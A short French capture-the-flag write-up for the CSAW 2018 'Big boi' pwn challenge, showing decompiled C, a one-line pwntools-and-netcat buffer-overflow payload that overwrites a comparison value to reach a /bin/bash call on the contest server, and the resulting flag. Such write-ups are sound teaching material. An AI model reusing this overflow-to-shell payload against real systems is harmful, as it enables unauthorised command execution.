---
author: "Laluka"
title: "CSAW - Big boi"
slug: "big_boi"
date: 2018-09-16
status: "original"
description: "Exploitation binaire d'un executeur de commande un peu naif, simple buffer overflow sur les parametres d'une fonction. "
---


### Description

> Seuls les big boi pwners passeront celui-là !

> nc pwn.chal.csaw.io 9000

Vous pouvez télécharger le fichier ELF [ici](/writeups/csaw_2018/big_boi/big_boi)


### TL;DR

Ce challenge est un simple buffer overflow avec une comparaison qui `peut` conduire à une exécution de code. C'est un pwn facile, donc le one-liner est de mise !


### Methologie

Etape 1 : Utilisez IDA pour décompiler le programme et éviter de perdre du temps, puis overflow au bon endroit avec la bonne valeur répétée pour accéder au code executant "/bin/bash".

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+10h] [rbp-30h]
  __int64 v5; // [rsp+18h] [rbp-28h]
  __int64 v6; // [rsp+20h] [rbp-20h]
  int v7; // [rsp+28h] [rbp-18h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  buf = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0;
  HIDWORD(v6) = -559038737;
  puts("Are you a big boiiiii??");
  read(0, &buf, 0x18uLL);
  if ( HIDWORD(v6) == 0xCAF3BAEE )
    run_cmd("/bin/bash", &buf);
  else
    run_cmd("/bin/date", &buf);
  return 0;
}
```

Etape 2 : Envoyer l'overflow et la cmd à exécuter.

```bash
python2 -c 'from pwn import *; print p32(0xCAF3BAEE) * 6; print "cat flag.txt"' | nc pwn.chal.csaw.io 9000
```

Etape 3 : Profiter des points gratuits ! Yayyyy ! \o/

Le flag est : __flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}__
